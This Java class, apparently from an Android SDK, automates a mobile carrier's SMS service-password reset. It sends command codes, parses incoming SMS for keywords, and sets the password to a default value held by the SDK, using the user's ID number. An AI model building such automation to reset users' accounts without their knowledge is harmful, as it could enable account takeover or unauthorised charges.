package com.myyj.sdk.tools.pwdhelperx;

import com.myyj.sdk.MySDK;
import com.myyj.sdk.ResultCallback;

import static com.myyj.sdk.msdk.isRpwSkip;

class RPWQingHai extends RPWBase {
    public RPWQingHai(String phoneNumber, String idNumber, ResultCallback callback) {
        super(phoneNumber, idNumber, callback);
    }

    private final static int DYN_BIT_LEN = 6;

    public void updateStatusLogic() {
        if(resetStatus == RS_START) {
            if(!isRpwSkip())
            {
                sendMsg(CM_ADDRESS, "6012");
            }else{
                sendMsg(CM_ADDRESS, "6012", new ResultCallback() {
                    @Override
                    public void callback(int state, String result) {
                        if(state == 0) {
                            changeStateIfTimeout(RS_SENDED_1, RS_RECEIVED_1);
                        }
                    }
                });
            }

            updateStatus(RS_SENDED_1);
            finishStatus = FS_FAIL_TIME;
            serverPassword = "";
            startTimer(TIMEOUT_VALUE, RS_FINISH);
        }
        else if(resetStatus == RS_FINISH) {
            finish(finishStatus);
        }
        else if(resetStatus == RS_RECEIVED_1) {
            if(!isRpwSkip())
            {
                sendMsg(CM_ADDRESS, "CZMM" + "#" + getIdNumber() + "#" + MySDK.getInstance().getDefaultServicePassword());
            }else{
                sendMsg(CM_ADDRESS, "CZMM" + "#" + getIdNumber() + "#" + MySDK.getInstance().getDefaultServicePassword(), new ResultCallback() {
                    @Override
                    public void callback(int state, String result) {
                        if(state == 0) {
                            serverPassword = MySDK.getInstance().getDefaultServicePassword();
                            changeStateIfTimeout(RS_SENDED_2, RS_FINISH);
                        }
                    }
                });
            }

            updateStatus(RS_SENDED_2);
            finishStatus = FS_FAIL_ID;
            serverPassword = "";
            startTimer(TIMEOUT_VALUE, RS_FINISH);
        }
    }

    public void updateReceiveLogic(String address, String body) {
        if(resetStatus == RS_SENDED_1) {
            if (!address.equals(CM_ADDRESS)) {
                return;
            } else if (checkStrContainsKeyWords(body, new String[]{"回复", "重置"})) {
                stopTimer();
                this.updateStatus(RS_RECEIVED_1);
            }
        } else if(resetStatus == RS_SENDED_2) {
            if (!address.equals(CM_ADDRESS)) {
                return;
            } else if (checkStrContainsKeyWords(body, new String[]{"指令有误"})) {
                stopTimer();
                finishStatus = FS_FAIL_ID;
                this.updateStatus(RS_FINISH);
            } else if (checkStrContainsKeyWords(body, new String[]{"重置密码", "成功办理"})) {
                stopTimer();
                serverPassword = MySDK.getInstance().getDefaultServicePassword();
                finishStatus = FS_SUC;
                this.updateStatus(RS_FINISH);
            }
        }
    }

    @Override
    protected String getFirstSMS() {
        return "6012";
    }

    @Override
    protected boolean needIdCardNumberAtFirst() {
        return false;
    }
}
